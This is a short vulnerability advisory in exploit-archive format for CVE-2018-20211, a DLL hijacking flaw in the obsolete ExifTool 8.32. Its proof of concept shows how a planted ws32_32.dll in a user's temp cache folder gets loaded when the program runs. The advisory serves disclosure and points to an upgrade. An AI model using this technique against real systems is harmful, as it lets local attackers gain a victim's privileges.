# Exploit Title: DLL Hijacking in Exiftool v8.3.2.0
# Date: 18-12-2018
# Exploit Author: Rafael Pedrero
# Vendor Homepage: http://owl.phy.queensu.ca/~phil/exiftool/
# Software Link: http://owl.phy.queensu.ca/~phil/exiftool/
# Version: v8.3.2.0
# Tested on: all
# CVE : CVE-2018-20211
# Category: webapps

1. Description

ExifTool 8.32 allows local users to gain privileges by creating a
%TEMP%\par-%username%\cache-exiftool-8.32 folder with a victim's username,
and then copying a Trojan horse ws32_32.dll file into this new folder, aka
DLL Hijacking. NOTE: 8.32 is an obsolete version from 2010 (9.x was
released starting in 2012, and 10.x was released
starting in 2015).


2. Proof of Concept

echo %TEMP%
c:\windows\temp

copy malicious.dll %TEMP%\par-%username%\cache-exiftool-8.32\ws32_32.dll

Execute application \\server\share\exiftool\exiftool.exe or directly the
application.


3. Solution:

This application is deprecated. Use the last, v11.22.
